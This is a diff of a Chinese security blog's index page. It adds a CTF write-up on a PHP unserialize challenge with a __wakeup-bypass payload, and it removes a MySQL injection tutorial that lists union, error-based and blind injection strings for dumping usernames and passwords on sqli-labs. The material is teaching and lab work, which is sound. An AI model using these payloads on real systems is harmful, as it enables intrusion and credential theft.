@@ -253,6 +253,210 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://da4er.top/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da4er's">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da4er's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP.html" itemprop="url">2.6 [极客大挑战 2019]PHP</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-06T11:06:11+08:00">
+                2020-02-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP.html" class="leancloud_visitors" data-flag-title="2.6 [极客大挑战 2019]PHP">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  393
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>根据题目提示：题目有源码备份，下载得到<a href="http://www.zip。" target="_blank" rel="noopener">www.zip。</a></strong></p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/3.png" class title="This is an test image">
+<p><strong>有三个php文件</strong><br>class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<p>flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &#39;Syc&#123;dog_dog_dog_dog&#125;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过分析知：$select进行反序列化。<br>关键在class.php中的_destruct()魔法函数。<br>对于序列化问题有调用魔法函数顺序的问题：</p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/4.png" class title="This is an test image">
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/5.png" class title="This is an test image">
+<p>对于题目需要将username=admin，password=100，但是会先执行_wakeup函数将username=guest，所以这道题目关键在于如何绕过_wakeup函数。<br><strong>知识点：如何绕过_wakeup</strong></p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/6.png" class title="This is an test image">
+<p>测试php：</p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1.png" class title="This is an test image">
+<p>形成payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+<p>这个payload绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失。<br>得到flag</p>
+<img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/2.png" class title="This is an test image">
+
+<p>参考博客：<br><a href="https://www.jianshu.com/p/bfe00fd583df" target="_blank" rel="noopener">https://www.jianshu.com/p/bfe00fd583df</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://da4er.top/2-6-SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1994,339 +2198,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://da4er.top/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Da4er's">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/3.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Da4er's Blogs">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3.html" itemprop="url">Mysql注入详解</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-23T16:05:14+08:00">
-                2019-11-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全&渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3.html" class="leancloud_visitors" data-flag-title="Mysql注入详解">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  4.4k
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  19
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近一直在学sql注入的专题，准备写个文章来记录这段时间学的过程。</p>
-<h2 id="一-有可显字段——使用常规注入法"><a href="#一-有可显字段——使用常规注入法" class="headerlink" title="一.有可显字段——使用常规注入法"></a>一.有可显字段——使用常规注入法</h2><p>用到的注入语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure>
-<p>常规的sql注入，通常有可显字段，通过在可显字段进行注入，从而达到注入的方法。<br>以sqli-labs第一关为例<br>用运用常规的sql注入</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image">
-
-<h3 id="加入单引号，发现报错，这里我们可以用报错注入的方式。"><a href="#加入单引号，发现报错，这里我们可以用报错注入的方式。" class="headerlink" title="加入单引号，发现报错，这里我们可以用报错注入的方式。"></a>加入单引号，发现报错，这里我们可以用报错注入的方式。</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image">
-
-<h3 id="通过对语句的闭合，发现单引号是sql语句的闭合符号。"><a href="#通过对语句的闭合，发现单引号是sql语句的闭合符号。" class="headerlink" title="通过对语句的闭合，发现单引号是sql语句的闭合符号。"></a>通过对语句的闭合，发现单引号是sql语句的闭合符号。</h3><p>and 1=1 返回正常<br>and 1=2 返回异常</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image">
-
-
-<h3 id="用order-by语句进行数据库的猜解"><a href="#用order-by语句进行数据库的猜解" class="headerlink" title="用order by语句进行数据库的猜解"></a>用order by语句进行数据库的猜解</h3><p>order by 数字 是按照第几列升序排序<br>order by 数字 DESC 是按照第几列降序排序</p>
-
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image">
-<p>我们用这条语句操作数据库，发现order by 4时报错，因为该数据库没有第四列，所以我们可以用order by语句进行对数据库列的猜解。<br>猜解到该数据库有三列。</p>
-<h3 id="猜解可显字段"><a href="#猜解可显字段" class="headerlink" title="猜解可显字段"></a>猜解可显字段</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image">
-<p>先将id=1换成id=-1 或者运用其他方式让其报错，在运用union select联合查询语句<br>发现2，3字段是可显字段。</p>
-<h3 id="查看当前数据库名和用户名"><a href="#查看当前数据库名和用户名" class="headerlink" title="查看当前数据库名和用户名"></a>查看当前数据库名和用户名</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image">
-<p>运用database()，user()两个函数<br>常用的还要version() 来查看数据库版本</p>
-<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3>
-<p>group_concat(xxx)这个函数通俗理解就是把xxx字段的数据聚合在一起返回。<br>例如：group_concat(table_name)意思是将table_name字段中的数据全部返回。<br>information_schema这个数据库保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。<br>information_schema是在mysql5.0版本开始使用，像5.0之前的版本要是注入的话，只能像注入access数据库一样，进行猜解。<br>information.schema.tables记录了整个mysql所有的表名<br>table_schema指定数据库名</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image">
-
-<h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image">
-<p>爆破字段名和爆破表名一样，只需要更改几个参数即可。<br>爆出来字段名：username，password俩个字段</p>
-<h3 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h3><img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image">
-<p>运用2，3可显字段 一块查询username，password字段内容<br>这里用到limit限定语句<br>limit 0,1 意思是查询字段中的第一个内容<br>limit 1,1 查询字段中第二个内容<br>limit 数字，数字  第一个数字指定查询的内容(从0开始)，第二个数字指定返回的数量。<br>不用limit语句也可以，还有一种注入语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users</span><br></pre></td></tr></table></figure>
-
-<p>用group_concat()聚合输出<br>使用函数CONCAT_WS（）。使用语法为：CONCAT_WS(separator,str1,str2,…)CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）<br>所以用上面的语句直接爆出users字段的所以内容。</p>
-<h2 id="二-无可显字段，有错误提示——报错注入"><a href="#二-无可显字段，有错误提示——报错注入" class="headerlink" title="二.无可显字段，有错误提示——报错注入"></a>二.无可显字段，有错误提示——报错注入</h2><p>启动了错误提示，并且出现在了浏览器中，即可运用报错注入</p>
-<h3 id="1-Floor语句报错注入"><a href="#1-Floor语句报错注入" class="headerlink" title="1.Floor语句报错注入"></a>1.Floor语句报错注入</h3><p>用到注入语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a)b)</span><br><span class="line">1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)</span><br><span class="line">1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)</span><br><span class="line">1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select concat(username,0x3a,password) from users limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)</span><br></pre></td></tr></table></figure>
-<p>floor语句报错主要用到：floor()，concat()，count()，rand(),group by<br>(1).floor()函数：floor(x) 向下取整，取小于等于x的最大整数。<br>(2).concat(x,x1,x2):将x，x1，x2整合到一个字符串。<br>(3).count() 返回指定表的行数<br>(4).rand() 随机返回数字<br>(5).group by+列名 按照某列分组<br>先做个实验，使用创建好的一个user表</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image">
-<p>count(*)</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image">
-
-<p>用count(*)，group by 联合使用，构建一个虚拟表</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image">
-
-<p>floor（rand(0)*2）<br>返回是伪随机，规律是：011011；</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image">
-<p>不给rand（）参数时，返回不确定</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image">
-
-<p>使用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(floor(rand(0)*2),(select version()))a from user group by x;</span><br></pre></td></tr></table></figure>
-<p>报出错误：</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image">
-
-<p>运用上面的规律：以sqli-labs第一关为例<br>第一关，虽然有可显字段，但是同样开启了错误显示，所以也可以用报错注入<br>报错注入是不用猜解表中的字段有多少列的，所以我们直接用一开始给出的语句进行报错</p>
-<p>爆当前的数据库名</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image">
-<p>爆表名</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image">
-
-<p>爆字段名</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image">
-
-<p>爆字段内容</p>
-
-
-<p>floor语句报错下面的几条博客不错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;he_and&#x2F;article&#x2F;details&#x2F;80455884</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzA5NDY0OTQ0Mw&#x3D;&#x3D;&amp;mid&#x3D;403404979&amp;idx&#x3D;1&amp;sn&#x3D;27d10b6da357d72304086311cefd573e&amp;scene&#x3D;1&amp;srcid&#x3D;04131X3lQlrDMYOCntCqWf6n#wechat_redirect</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;litlife&#x2F;p&#x2F;8472323.html</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;Fly_hps&#x2F;article&#x2F;details&#x2F;79416620</span><br></pre></td></tr></table></figure>
-<h3 id="2-extractvalue-函数报错注入"><a href="#2-extractvalue-函数报错注入" class="headerlink" title="2.extractvalue()函数报错注入"></a>2.extractvalue()函数报错注入</h3><p>用到的注入语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) --+</span><br><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e)) --+</span><br><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
-<p>extractvalue()用于对查询xml文档的函数<br>有两个参数，其中第二个参数是可操作的地方 第二个参数必须是 /xxx/xxx/xxx/…这种格式，要不就报错，所以基于这个特性，可以进行报错注入<br>以sqli-labs第五关为例：</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image">
-<p>开启了错误提示 可以使用报错注入<br>然后用上面的注入语句进行注入：</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image">
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image">
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image">
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image">
-
-<h3 id="updatexml-函数报错注入"><a href="#updatexml-函数报错注入" class="headerlink" title="updatexml()函数报错注入"></a>updatexml()函数报错注入</h3><p>用到的注入语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e) --+</span><br><span class="line">1&#39; and updatexml(0x7e,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e),0x7e) --+</span><br><span class="line">1&#39; and updatexml(0x7e,concat(0x7e,(select column_name from information_schema.cloumns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),0x7e) --+</span><br><span class="line">1&#39; and updatexml(0x7e,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),0x7e)  --+</span><br></pre></td></tr></table></figure>
-<p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。<br>updatexml()有三个参数，其中第二个参数可操作 ，是xml的路径 必须是/xx/xx这种格式的 ，所以和上一个类似，构造注入语句<br>以sqli-labs第五关为例：<br>用上面的注入语句<br>爆出数据版本</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image">
-<p>爆出表名</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image">
-<p>爆出字段名</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image">
-<p>爆出字段内容</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image">
-
-
-<p>extractvalue()和updatexml()报错注入参考文章：</p>
-<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p>
-<p>报错注入的语句还有很多，但是主要还是上面三种，其他的语句和上面三种类似<br>其他报错注入文章：<br><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
-<h2 id="三-无可显字段无错误提示-但出现数据提交正确和错误俩种不同页面"><a href="#三-无可显字段无错误提示-但出现数据提交正确和错误俩种不同页面" class="headerlink" title="三.无可显字段无错误提示,但出现数据提交正确和错误俩种不同页面"></a>三.无可显字段无错误提示,但出现数据提交正确和错误俩种不同页面</h2><p>这类注入利用属于盲注中的布尔盲注，在无可显字段无错误提示，但数据提交正确和错误两种不同页面时使用。有时在不能使用union select语句时，也会使用这类盲注。<br>用的函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- Length（）&#x2F;&#x2F;返回字符串的长度</span><br><span class="line">Length（abc）返回3，表示abc字符串长度为3</span><br><span class="line">   </span><br><span class="line">- Substr（）&#x2F;&#x2F;截取字符串</span><br><span class="line">Stbstr(abc,1,1) 返回a，从abc的第一位开始截，步长为1。</span><br><span class="line">   </span><br><span class="line">- mid() &#x2F;&#x2F;取出字符串的一部分值</span><br><span class="line">mid(abc,1,1) 返回a，从abc的第一位开取，步长为1.与substr（）用法一致</span><br><span class="line">   </span><br><span class="line">- left() &#x2F;&#x2F;取出字符串左边的几个数据</span><br><span class="line">left(abc,1) 返回a</span><br><span class="line">left(abc,2) 返回ab</span><br><span class="line">   </span><br><span class="line">- right()  &#x2F;&#x2F;取出右边的几个数据</span><br><span class="line">right(abc,1) 返回c</span><br><span class="line">right(abc,2) 返回bc</span><br><span class="line">   </span><br><span class="line">- ord（）与 ascii（）&#x2F;&#x2F;返回一个字符的ascii码值</span><br><span class="line">ascii(s) 返回114</span><br><span class="line">   </span><br><span class="line">- hex（） &#x2F;&#x2F;返回16进制数</span><br></pre></td></tr></table></figure>
-<p>用到的注入语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length(database())&gt;7</span><br><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100</span><br><span class="line">ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;117</span><br><span class="line">ascii(substr((select username from users limit 0,1),1,1))&gt;6</span><br></pre></td></tr></table></figure>
-<p>不需要union select 即可完成注入工作</p>
-<p>以sqli-labs第八章为例</p>
